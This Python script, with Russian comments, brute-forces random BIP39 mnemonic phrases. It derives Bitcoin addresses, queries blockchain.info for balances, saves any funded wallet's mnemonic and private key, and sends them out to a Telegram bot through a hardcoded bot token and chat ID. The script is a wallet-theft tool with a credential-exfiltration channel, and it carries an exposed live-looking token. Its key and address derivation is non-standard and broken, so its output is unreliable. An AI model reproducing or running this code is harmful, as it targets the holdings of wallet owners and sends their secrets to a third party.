import os
import hashlib
import base58
import aiohttp
import asyncio
import sys
import gc
from datetime import datetime
from mnemonic import Mnemonic
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend
import ctypes
import time
from termcolor import colored
import bech32
import aiofiles

# Глобальные счетчики
total_checked = 0
total_balance = 0
start_time = time.time()  # Запоминаем время начала работы скрипта

# Telegram настройки
TELEGRAM_CHAT_ID = "1364623030"
TELEGRAM_BOT_TOKEN = "8150302125:AAEBG5hL4Cl6CgrtCuzlRZN7MYWZy5fCjRI"

def calculate_progress(total_checked):
    percentage = (total_checked % 100_000_000) / 1_000_000  # Процент от 100 миллионов
    progress_bar_length = 30  # Длина прогресс-бара
    filled_length = int(progress_bar_length * (percentage / 100))
    bar = '=' * filled_length + '-' * (progress_bar_length - filled_length)
    num_carets = (total_checked // 100_000_000) % 10
    num_percent = total_checked // 1_000_000_000
    return bar, percentage, num_carets, num_percent

def generate_key_and_addresses(mnemonic_phrase):
    seed = Mnemonic("english").to_seed(mnemonic_phrase)
    private_key_bytes = hashlib.sha256(seed).digest()
    private_key = ec.derive_private_key(int.from_bytes(private_key_bytes, byteorder="big"), ec.SECP256K1(), default_backend())

    public_key = private_key.public_key()
    serialized_public_key = public_key.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    sha256_hash = hashlib.sha256(serialized_public_key).digest()
    ripemd160_hash = hashlib.new('ripemd160')
    ripemd160_hash.update(sha256_hash)
    hashed_public_key = ripemd160_hash.digest()

    addresses = {}

    # Generate P2PKH address
    extended_hashed_public_key = b'\x00' + hashed_public_key
    checksum = hashlib.sha256(hashlib.sha256(extended_hashed_public_key).digest()).digest()[:4]
    binary_address = extended_hashed_public_key + checksum
    addresses["P2PKH"] = base58.b58encode(binary_address).decode('utf-8')

    # Generate P2SH address
    extended_hashed_public_key = b'\x05' + hashed_public_key
    checksum = hashlib.sha256(hashlib.sha256(extended_hashed_public_key).digest()).digest()[:4]
    binary_address = extended_hashed_public_key + checksum
    addresses["P2SH"] = base58.b58encode(binary_address).decode('utf-8')

    # Generate P2WPKH address
    witness_version = 0
    witness_program = bech32.convertbits(hashed_public_key, 8, 5, True)
    addresses["P2WPKH"] = bech32.bech32_encode("bc", [witness_version] + witness_program)

    # Generate P2WSH address
    sha256_witness_hash = hashlib.sha256(serialized_public_key).digest()
    witness_program = bech32.convertbits(sha256_witness_hash, 8, 5, True)
    addresses["P2WSH"] = bech32.bech32_encode("bc", [witness_version] + witness_program)

    # Добавляем важный формат
    wallet_import_format = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    ).decode('utf-8')

    return private_key_bytes, addresses, wallet_import_format

async def get_balances(session: aiohttp.ClientSession, addresses: tuple) -> dict:
    try:
        # API позволяет получать баланс сразу для нескольких адресов через разделитель "|"
        address_str = '|'.join(addresses)
        async with session.get(f"https://blockchain.info/multiaddr?active={address_str}", timeout=20) as response:
            response.raise_for_status()
            data = await response.json()
            balances = {info['address']: info['final_balance'] / 100000000 for info in data['addresses']}
            return balances
    except (asyncio.TimeoutError, aiohttp.ClientError):
        # Если произошла ошибка, вернем 0 для всех адресов
        return {address: 0.0 for address in addresses}

async def send_to_telegram(message: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload) as response:
                response.raise_for_status()
        except Exception as e:
            print(colored(f"Ошибка отправки в Telegram: {e}", "red"))

async def update_status_bar():
    global total_checked, total_balance, start_time
    while True:
        elapsed_time = time.time() - start_time
        checks_per_second = total_checked / elapsed_time
        bar, percentage, num_carets, num_percent = calculate_progress(total_checked)
        title = f"bvtc by stikcs || Проверок: {total_checked} || Баланс: {total_balance:.8f} BTC || Прогресс: [{bar}] {percentage:.2f}% {'%' * num_percent}{'^' * num_carets} 0 - 100kk || Скорость: {checks_per_second:.2f} проверок/сек"
        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        else:
            print(f"\033]0;{title}\007", end='', flush=True)
        await asyncio.sleep(1)

def generate_mnemonic():
    return Mnemonic("english").generate(128)

async def worker(output_directory: str, session: aiohttp.ClientSession) -> None:
    global total_checked, total_balance
    while True:
        mnemonic_phrase = generate_mnemonic()
        private_key_bytes, addresses, wallet_import_format = generate_key_and_addresses(mnemonic_phrase)

        balances = await get_balances(session, tuple(addresses.values()))

        total_checked += len(addresses)
        total_balance_for_wallet = sum(balances.values())
        if total_balance_for_wallet > 0:
            file_name = f"btvc_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
            file_path = os.path.join(output_directory, file_name)
            async with aiofiles.open(file_path, 'a') as f:
                await f.write(f"{datetime.now()}: Mnemonic Phrase: {mnemonic_phrase}\n")
                await f.write(f"Private Key: {wallet_import_format}\n")
                for address_type, address in addresses.items():
                    await f.write(f"{address_type} Address: {address}\n")
                await f.write("\n\n")

            total_balance += total_balance_for_wallet

            # Формируем сообщение для Telegram
            message = (
                f"\u2705 Обнаружен баланс!\n\n"
                f"Mnemonic Phrase: {mnemonic_phrase}\n"
                f"Private Key: {wallet_import_format}\n"
                + '\n'.join([f"{address_type}: {address}" for address_type, address in addresses.items()]) +
                f"\n\nБаланс: {total_balance_for_wallet:.8f} BTC"
            )
            await send_to_telegram(message)

async def main(output_directory: str):
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit_per_host=100)) as session:
        tasks = []
        for _ in range(200):  # Увеличиваем количество воркеров до 200
            task = asyncio.create_task(worker(output_directory, session))
            tasks.append(task)

        tasks.append(asyncio.create_task(update_status_bar()))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    output_directory = "bvtc_wallets"
    os.makedirs(output_directory, exist_ok=True)
    try:
        asyncio.run(main(output_directory))
    except KeyboardInterrupt:
        print(colored("Завершение работы программы.", "yellow"))
        sys.exit(0)